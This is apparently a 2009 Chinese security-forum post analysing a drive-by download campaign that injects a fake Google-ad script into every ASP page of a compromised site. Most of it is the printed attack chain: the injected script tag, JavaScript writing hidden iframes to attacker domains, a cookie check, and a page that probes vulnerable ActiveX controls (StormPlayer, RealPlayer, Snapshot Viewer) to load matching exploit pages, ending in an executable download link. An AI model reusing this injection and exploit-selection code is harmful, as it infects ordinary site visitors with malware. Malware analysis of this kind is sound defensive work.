# 伪装GOOGLE广告的挂马方式

> **作者**: Hmily | **发布时间**: 2009-03-23 11:48:00 | **版块**: 『病毒样本区』 | **查看/回复**: 2944 / 5
> **原文**: [https://www.52pojie.cn/thread-20874-1-1.html](https://www.52pojie.cn/thread-20874-1-1.html)

---

所有的asp页面被挂
<script language="javascript" src="[http://faq.ht.cx/office.js?google\_ad\_format=728x90\_as&google\_ad\_type=text\_image"></script](http://faq.ht.cx/office.js?google_ad_format=728x90_as&google_ad_type=text_image)>

查看[http://faq.ht.cx/office.js](http://faq.ht.cx/office.js?google_ad_format=728x90_as&google_ad_type=text_image)内容为
var sc=document.getElementsByTagName('script');
var paramsArr=sc[sc.length-1].src.split('//')[1].split('?');
var cookA = new String(document.cookie);
var Then = new Date();
var cookName = '9B4A4C5EBF042C02' ;
Then.setTime(Then.getTime() + 30\*60\*1000 );
var kesor = cookA.indexOf(cookName);
if (kesor == -1)
   {
document.write('<iframe src=http://www.rfgrgd.cn/33/new.htm width=100 height=0></iframe>');
document.write('<iframe src=http://www.rfgrgd.cn/33/new.htm width=100 height=0></iframe>');
document.write('<iframe src=http://www.rfgrgd.cn/33/new.htm width=100 height=0></iframe>');
document.write('<iframe src=http://www.rfgrgd.cn/33/new.htm width=100 height=0></iframe>');
document.write('<iframe src=http://www.rfgrgd.cn/33/new.htm width=100 height=0></iframe>');
document.write('<iframe src=http://www.rfgrgd.cn/33/new.htm width=100 height=0></iframe>');
document.write('<iframe src=http://www.rfgrgd.cn/33/new.htm width=100 height=0></iframe>');
document.write('<IFRAME marginWidth=0 marginHeight=0 src="[http://count47.51yes.com/sa.aspx?id=470909911&refe='+window.parent.location+'&location=http%3A//'+paramsArr[0]+'&color=32x&resolution=1024x768&returning=0&language=zh-cn&ua=Mozilla/4.0%20%28compatible%3B%20MSIE%206.0%3B%20Windows%20NT%205.1%3B%20SV1%3B%20.NET%20CLR%202.0.50727%3B%20.NET%20CLR%203.0.04506.30%29](http://count47.51yes.com/sa.aspx?id=470909911&refe=)" frameBorder=0 width=0 scrolling=no height=0></IFRAME>');
   document.cookie = "A1="+ cookName +";expires="+ Then.toGMTString() +";path=/";
   }

<http://www.rfgrgd.cn/33/new.htm>内容为
<html>
<iframe src="au.htm" width=111 height=0 border=0></iframe>
<br>
<br>
<br>
<br>
<br>
<script type="text/javascript">
var allok=Math.floor(Math.random()\*8000);if((allok>6500))
document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/js.tongji.cn.yahoo.com\/986651\/ystat.js\"><\/script><noscript><a href=\"http:\/\/tongji.cn.yahoo.com\"><img src=\"http:\/\/img.tongji.cn.yahoo.com\/986651\/ystat.gif\"\/><\/a><\/noscript>");

</script>

au.htm内容为
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
<html>
<script>
if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)
document.write("<iframe width=100 height=0 src=tnt.htm></iframe>");
document.write("<iframe width=100 height=0 src=flash.htm></iframe>");
if(navigator.userAgent.toLowerCase().indexOf("msie 7")>0)
document.write("<iframe src=02.htm width=100 height=0></iframe>");
try{var d;
var lz=new ActiveXObject("GLI"+"EDown.I"+"EDown.1");}
catch(d){};
finally{if(d!="[object Error]"){document.write("<iframe width=100 height=0 src=lz.htm></iframe>");}}
try{var b;
var of=new ActiveXObject("snpvw.Snap"+"shot Viewer Control.1");}
catch(b){};
finally{if(b!="[object Error]"){document.write("<iframe width=100 height=0 src=bf.htm></iframe>");}}
try{var f;
var ff=new ActiveXObject("MPS.Storm"+"Player.1");}
catch(f){};
finally{if(f!="[object Error]"){document.write("<iframe width=100 height=0 src=office.htm></iframe>");}}
function Game()
{
Hdmddd = "IERPCtl.IERPC"+"tl.1";
try
{
Gime = new ActiveXObject(Hdmddd);
}catch(error){return;}
Tellm = Gime.PlayerProperty("PRODUCTV"+"ERSION");
if(Tellm<="6.0.14.552")
document.write("<iframe width=100 height=0 src=real.htm></iframe>");
else
document.write("<iframe width=100 height=0 src=real.html></iframe>");
}
Game();
</script>
</html>
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
里面的

<http://www.tyjtre.cn/1.exe>
